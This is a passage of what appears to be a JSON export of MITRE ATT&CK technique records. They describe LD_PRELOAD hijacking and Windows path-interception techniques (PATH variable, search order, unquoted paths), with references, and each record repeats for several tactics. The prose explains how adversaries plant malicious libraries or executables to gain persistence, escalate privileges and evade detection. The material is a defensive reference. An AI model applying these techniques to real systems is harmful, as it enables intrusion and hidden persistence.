    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary’s malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or <!-- raw HTML omitted -->/etc/ld.so.preload<!-- raw HTML omitted --> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by LD_PRELOAD with be loaded and mapped into memory by <!-- raw HTML omitted -->dlopen()<!-- raw HTML omitted --> and <!-- raw HTML omitted -->mmap()<!-- raw HTML omitted --> respectively.(Citation: Code Injection on Linux and macOS) (Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)<!-- raw HTML omitted --><!-- raw HTML omitted -->LD_PRELOAD hijacking may grant access to the victim process’s memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux",
    "tid": "T1574.006",
    "technique": "LD_PRELOAD",
    "tactic": "privilege-escalation",
    "datasources": "environment-variable|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary’s malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or <!-- raw HTML omitted -->/etc/ld.so.preload<!-- raw HTML omitted --> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by LD_PRELOAD with be loaded and mapped into memory by <!-- raw HTML omitted -->dlopen()<!-- raw HTML omitted --> and <!-- raw HTML omitted -->mmap()<!-- raw HTML omitted --> respectively.(Citation: Code Injection on Linux and macOS) (Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)<!-- raw HTML omitted --><!-- raw HTML omitted -->LD_PRELOAD hijacking may grant access to the victim process’s memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux",
    "tid": "T1574.006",
    "technique": "LD_PRELOAD",
    "tactic": "defense-evasion",
    "datasources": "environment-variable|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary’s malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or <!-- raw HTML omitted -->/etc/ld.so.preload<!-- raw HTML omitted --> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by LD_PRELOAD with be loaded and mapped into memory by <!-- raw HTML omitted -->dlopen()<!-- raw HTML omitted --> and <!-- raw HTML omitted -->mmap()<!-- raw HTML omitted --> respectively.(Citation: Code Injection on Linux and macOS) (Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)<!-- raw HTML omitted --><!-- raw HTML omitted -->LD_PRELOAD hijacking may grant access to the victim process’s memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.<!-- raw HTML omitted --><!-- raw HTML omitted -->The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <!-- raw HTML omitted -->%SystemRoot%\\system32<!-- raw HTML omitted --> (e.g., <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted -->), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, if <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> precedes <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted --> is in the PATH environment variable, a program that is named net.exe and placed in <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> will be called instead of the Windows system “net” when “net” is executed from the command-line.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ]
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.<!-- raw HTML omitted --><!-- raw HTML omitted -->The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <!-- raw HTML omitted -->%SystemRoot%\\system32<!-- raw HTML omitted --> (e.g., <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted -->), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, if <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> precedes <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted --> is in the PATH environment variable, a program that is named net.exe and placed in <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> will be called instead of the Windows system “net” when “net” is executed from the command-line.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ]
  },
  {
    "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
    "platform": "windows",
    "tid": "T1574.007",
    "technique": "Path Interception by PATH Environment Variable",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.<!-- raw HTML omitted --><!-- raw HTML omitted -->The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <!-- raw HTML omitted -->%SystemRoot%\\system32<!-- raw HTML omitted --> (e.g., <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted -->), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, if <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> precedes <!-- raw HTML omitted -->C:\\Windows\\system32<!-- raw HTML omitted --> is in the PATH environment variable, a program that is named net.exe and placed in <!-- raw HTML omitted -->C:\\example path<!-- raw HTML omitted --> will be called instead of the Windows system “net” when “net” is executed from the command-line.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      }
    ]
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program’s directory.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, “example.exe” runs “cmd.exe” with the command-line argument <!-- raw HTML omitted -->net user<!-- raw HTML omitted -->. An adversary may place a program called “net.exe” within the same directory as example.exe, “net.exe” will be run instead of the Windows system utility net. In addition, if an adversary places a program called “net.com” in the same directory as “net.exe”, then <!-- raw HTML omitted -->cmd.exe /C net user<!-- raw HTML omitted --> will execute “net.com” instead of “net.exe” due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking is also a common practice for hijacking DLL loads and is covered in <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program’s directory.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, “example.exe” runs “cmd.exe” with the command-line argument <!-- raw HTML omitted -->net user<!-- raw HTML omitted -->. An adversary may place a program called “net.exe” within the same directory as example.exe, “net.exe” will be run instead of the Windows system utility net. In addition, if an adversary places a program called “net.com” in the same directory as “net.exe”, then <!-- raw HTML omitted -->cmd.exe /C net user<!-- raw HTML omitted --> will execute “net.com” instead of “net.exe” due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking is also a common practice for hijacking DLL loads and is covered in <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
    "platform": "windows",
    "tid": "T1574.008",
    "technique": "Path Interception by Search Order Hijacking",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program’s directory.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, “example.exe” runs “cmd.exe” with the command-line argument <!-- raw HTML omitted -->net user<!-- raw HTML omitted -->. An adversary may place a program called “net.exe” within the same directory as example.exe, “net.exe” will be run instead of the Windows system utility net. In addition, if an adversary places a program called “net.com” in the same directory as “net.exe”, then <!-- raw HTML omitted -->cmd.exe /C net user<!-- raw HTML omitted --> will execute “net.com” instead of “net.exe” due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)<!-- raw HTML omitted --><!-- raw HTML omitted -->Search order hijacking is also a common practice for hijacking DLL loads and is covered in <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/159.html",
        "description": "none",
        "external_id": "CAPEC-159"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Windows NT Command Shell",
        "url": "https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",
        "description": "Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinExec",
        "url": "http://msdn.microsoft.com/en-us/library/ms687393",
        "description": "Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Environment Property",
        "url": "https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN",
        "description": "Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary’s executable to launch.<!-- raw HTML omitted --><!-- raw HTML omitted -->Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <!-- raw HTML omitted -->C:\\unsafe path with space\\program.exe<!-- raw HTML omitted --> vs. <!-- raw HTML omitted -->”C:\\safe path with space\\program.exe”<!-- raw HTML omitted -->). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <!-- raw HTML omitted -->C:\\program files\\myapp.exe<!-- raw HTML omitted -->, an adversary may create a program at <!-- raw HTML omitted -->C:\\program.exe<!-- raw HTML omitted --> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
        "description": "HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Privilege Escalation Guide",
        "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
        "description": "absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
    "platform": "windows",
    "tid": "T1574.009",
    "technique": "Path Interception by Unquoted Path",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary’s executable to launch.<!-- raw HTML omitted --><!-- raw HTML omitted -->Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <!-- raw HTML omitted -->C:\\unsafe path with space\\program.exe<!-- raw HTML omitted --> vs. <!-- raw HTML omitted -->”C:\\safe path with space\\program.exe”<!-- raw HTML omitted -->). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <!-- raw HTML omitted -->C:\\program files\\myapp.exe<!-- raw HTML omitted -->, an adversary may create a program at <!-- raw HTML omitted -->C:\\program.exe<!-- raw HTML omitted --> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/38.html",
        "description": "none",
        "external_id": "CAPEC-38"
      },
      {
        "source_name": "Microsoft CurrentControlSet Services",
        "url": "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree",
        "description": "Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Help eliminate unquoted path",
        "url": "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
        "description": "Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Unquoted Services",
        "url": "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
